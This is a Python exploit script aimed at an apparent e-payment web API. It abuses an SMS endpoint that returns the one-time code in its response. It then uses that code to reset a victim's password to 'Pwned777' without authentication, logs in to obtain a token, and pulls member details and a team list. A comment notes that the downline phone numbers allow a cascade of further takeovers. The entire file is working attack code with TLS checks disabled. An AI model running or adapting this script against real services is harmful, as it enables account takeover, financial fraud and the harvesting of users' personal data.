import base64, json, urllib.request, ssl
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE='https://example.com'
PUB='''-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC9ambrwG3S0Wmab1Xch9SpWx+P
eQwaylm3JzGHp1fo8frF1FvCu35XAOH29QOKp6xtkVnRzest6mKCvqdCY1DhjkzX
pPFqIPRORSTpGxfk/cUzFxpo3nD3v7q8HBx2uFK0VAjnA8samH7d8ASzIuZzVubq
p6qIxa3f5ljyxltPcwIDAQAB
-----END PUBLIC KEY-----'''
KEY=RSA.import_key(PUB)
def enc(d):
    b=json.dumps(d,separators=(',',':')).encode(); o=b''
    for i in range(0,len(b),117):
        o+=PKCS1_v1_5.new(KEY).encrypt(b[i:i+117])
    return base64.b64encode(o).decode()
def post(p,obj,tok=None):
    h={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
    if tok: h['Authorization']='Bearer '+tok
    r=urllib.request.Request(BASE+p,data=json.dumps(obj).encode(),headers=h,method='POST')
    return urllib.request.urlopen(r,timeout=30,context=CTX).read().decode()
def get(p,tok):
    r=urllib.request.Request(BASE+p,headers={'Authorization':'Bearer '+tok,'User-Agent':'Mozilla/5.0'})
    return urllib.request.urlopen(r,timeout=30,context=CTX).read().decode()
# 1) leak OTP
acct='1234567890'
j=json.loads(post('/epay/api/sendSmsCode',{'params':enc({'phone':acct,'type':'password'})}))
code=j['message']; print('OTP',code)
# 2) reset password unauth
print(post('/epay/api/modifyPasswordBySms',{'account':acct,'password':'Pwned777','password_confirmation':'Pwned777','sms_code':code}))
# 3) login
r=json.loads(post('/epay/api/login',{'params':enc({'account':acct,'password':'Pwned777','remember':False})}))
tok=r['data']['token']; print('TOKEN',tok[:40])
print(get('/epay/api/member/getInfo',tok))
print(get('/epay/api/team/list?pageSize=100',tok))   # 下级手机号 -> 级联
